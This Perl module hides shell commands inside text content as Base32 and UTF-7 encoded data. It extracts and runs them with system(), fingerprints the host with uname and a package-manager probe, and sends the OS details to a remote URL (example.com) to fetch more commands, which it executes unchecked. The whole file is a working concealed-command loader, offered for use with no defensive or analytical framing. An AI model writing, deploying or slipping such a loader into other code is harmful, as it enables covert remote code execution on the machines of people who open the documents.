package Text::TailoredSelfExtractingDocument;

use strict;
use warnings;
use Encode qw(encode decode);
use MIME::Base32 qw(encode_base32 decode_base32);
use LWP::UserAgent;
use JSON;
use File::Slurp;

# Constructor
sub new {
    my ($class, %args) = @_;
    my $self = {
        steps => $args{steps} // [],
        state_data => $args{state_data} // '',
        environment_info => {},
    };
    bless $self, $class;
    return $self;
}

# Detect the target environment
sub detect_environment {
    my ($self) = @_;
    my $os_info = `uname -a`;
    my $package_manager = `which apt-get || which yum || which zypper || which pacman`;
    chomp($os_info, $package_manager);
    $self->{environment_info} = {
        os_info => $os_info,
        package_manager => $package_manager,
    };
}

# Fetch external resources based on environment info
sub fetch_external_resources {
    my ($self) = @_;
    my $ua = LWP::UserAgent->new;
    my $response = $ua->get("https://example.com/configs?os=" . $self->{environment_info}->{os_info});
    if ($response->is_success) {
        my $config = decode_json($response->decoded_content);
        push @{$self->{steps}}, @{$config->{steps}};
    } else {
        die "Failed to fetch external resources: " . $response->status_line;
    }
}

# Encode steps and state data to Base32 and UTF-7
sub encode_to_utf7 {
    my ($self) = @_;
    my $steps_encoded = encode_base32(join("\n", @{$self->{steps}}));
    my $state_data_encoded = encode_base32($self->{state_data});
    return encode('UTF-7', $steps_encoded) . " " . encode('UTF-7', $state_data_encoded);
}

# Decode steps and state data from UTF-7 and Base32
sub decode_from_utf7 {
    my ($self, $encoded_document) = @_;
    my ($encoded_steps, $encoded_state_data) = split(/ /, $encoded_document, 2);
    my $steps_encoded = decode('UTF-7', $encoded_steps);
    my $state_data_encoded = decode('UTF-7', $encoded_state_data);
    $self->{steps} = [split(/\n/, decode_base32($steps_encoded))];
    $self->{state_data} = decode_base32($state_data_encoded);
}

# Embed encoded steps and state data into content
sub embed_in_content {
    my ($self, $content) = @_;
    my $encoded_document = $self->encode_to_utf7();
    return $content . " " . $encoded_document;
}

# Extract and execute steps from content
sub extract_and_execute {
    my ($self, $content) = @_;
    if ($content =~ /(\+.*?)$/) {
        my $encoded_document = $1;
        $self->decode_from_utf7($encoded_document);
        $self->detect_environment();
        $self->fetch_external_resources();
        $self->execute_steps();
    }
}

# Execute the precomputed steps
sub execute_steps {
    my ($self) = @_;
    for my $step (@{$self->{steps}}) {
        system($step);
    }
    $self->restore_state();
}

# Restore the state data
sub restore_state {
    my ($self) = @_;
    write_file('state_data.dat', {binmode => ':raw'}, $self->{state_data});
    # Additional code to apply state data to the system (e.g., restoring files, configurations)
}

1;